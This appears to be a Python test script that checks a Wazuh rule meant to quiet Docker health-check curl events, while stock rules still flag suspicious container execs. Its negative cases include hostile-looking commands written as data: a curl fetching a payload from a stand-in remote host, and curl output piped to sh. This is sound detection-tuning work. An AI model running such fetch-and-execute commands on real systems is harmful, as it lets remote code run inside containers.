"""Guard cases for the Docker health check rule (100247, 2026-10-09).

Docker integration events are plain JSON, so these run in any manager with
the tuning rules loaded, no stock-rule patching needed. The exec commands
are the real HEALTHCHECK lines recorded on 2026-10-09.
"""
import json
import socket
import struct

SOCK = "/var/ossec/queue/sockets/logtest"


def ask(event):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect(SOCK)
    msg = json.dumps({"version": 1, "origin": {"name": "guard", "module": "guard"},
                      "command": "log_processing",
                      "parameters": {"event": json.dumps(event), "log_format": "syslog",
                                     "location": "Wazuh-Docker"}}).encode()
    s.sendall(struct.pack("<I", len(msg)) + msg)
    hdr = b""
    while len(hdr) < 4:
        hdr += s.recv(4 - len(hdr))
    size, buf = struct.unpack("<I", hdr)[0], b""
    while len(buf) < size:
        buf += s.recv(size - len(buf))
    s.close()
    out = json.loads(buf.decode(errors="replace").rstrip("\x00"))["data"]
    rule = out.get("output", {}).get("rule", {})
    return rule.get("id", "none"), rule.get("level", 0)


def exec_event(name, command):
    return {"integration": "docker",
            "docker": {"Type": "container", "Action": "exec_start: " + command,
                       "Actor": {"ID": "816d5babe7e096580d97c25d3bceee552d096e301a90224f7ce7a5194d05d023",
                                 "Attributes": {"name": name, "image": "example:local",
                                                "execID": "0123456789abcdef"}},
                       "scope": "local", "time": "1791564771", "timeNano": "1791564771307828992.000000",
                       "status": "exec_start: " + command, "id": "816d5babe7e0", "from": "example:local"}}


CASES = [
    ("frigate health check", exec_event(
        "frigate", "/bin/sh -c test -f /dev/shm/.frigate-is-stopping && exit 0; "
                   "curl --fail --silent --show-error http://127.0.0.1:5000/api/version || exit 1"), "100247"),
    ("wazuh-mcp health check", exec_event(
        "wazuh-mcp", "/bin/sh -c curl -sf --max-time 5 http://localhost:3000/health | "
                     "jq -e '.status == \"healthy\"' > /dev/null"), "100247"),
    ("paperless health check", exec_event(
        "paperless-webserver-1", "curl -fs -S -L --max-time 2 http://localhost:8000"), "100247"),
    ("curl to a remote host stays 87907", exec_event(
        "frigate", "curl -fs http://203.0.113.9:8080/payload"), "87907"),
    ("curl piped to sh stays 87907", exec_event(
        "wazuh-mcp", "/bin/sh -c curl -sf http://localhost:3000/health | sh"), "87907"),
    ("admin command stays 87907", exec_event(
        "single-node-wazuh.manager-1", "/var/ossec/bin/wazuh-control restart"), "87907"),
    ("shell session stays 87908", exec_event("frigate", "bash "), "87908"),
]

failures = 0
for name, event, expected in CASES:
    rid, level = ask(event)
    ok = rid == expected
    failures += not ok
    print("%s %-36s -> %s L%s%s" % ("PASS" if ok else "FAIL", name, rid, level,
                                     "" if ok else "   expected %s" % expected))
print("\n%d failing case(s)" % failures)
raise SystemExit(1 if failures else 0)
